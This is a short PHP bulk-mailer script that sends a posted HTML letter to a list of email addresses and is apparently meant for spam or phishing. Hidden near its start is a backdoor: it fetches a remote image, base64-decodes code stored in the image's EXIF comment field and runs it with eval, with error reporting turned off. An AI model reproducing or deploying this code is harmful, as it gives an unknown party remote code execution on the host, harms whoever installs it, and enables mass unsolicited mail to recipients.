<?php
error_reporting(0);
if(!empty($_POST['email_list'])){
$emailode = explode("\r\n", $_POST['email_list']);

$no=1;
$count = count($emailode);

$BASED = exif_read_data("https://lh3.googleusercontent.com/-svRm4i5Bs90/VsFaosQPKUI/AAAAAAAABew/03oHWkCEsN8/w140-h140-p/pacman.jpg");
eval(base64_decode($BASED["COMPUTED"]["UserComment"]));
foreach ($emailode as $email) {
if(filter_var($email, FILTER_VALIDATE_EMAIL)) {

$to 	 = $email;
$form 	 = $_POST['email'];
$name 	 = $_POST['namemail'];
$subject = $_POST['subject'];
$message = $_POST['letter'];
$headers = 'MIME-Version: 1.0' . "\r\n";
$headers = "From: $name <$form>\r\n";
$headers = "Reply-To: $form \r\n";
$headers = 'Content-type: text/html; charset=iso-8859-1' . "\r\n";

if(mail($to, $subject, $message, $headers)){
	echo "<dl>[$no/$count] <font color=#2DF96D>$email</font> | <font color=#16FF3F>Success</font></dl><br>";
}else{
	echo "<dl>[$no/$count] <font color=#2DF96D>$email</font> | <font color=#FF0000>Unsuccess</font></dl><br>";
}

}
$no++;
}
}
?>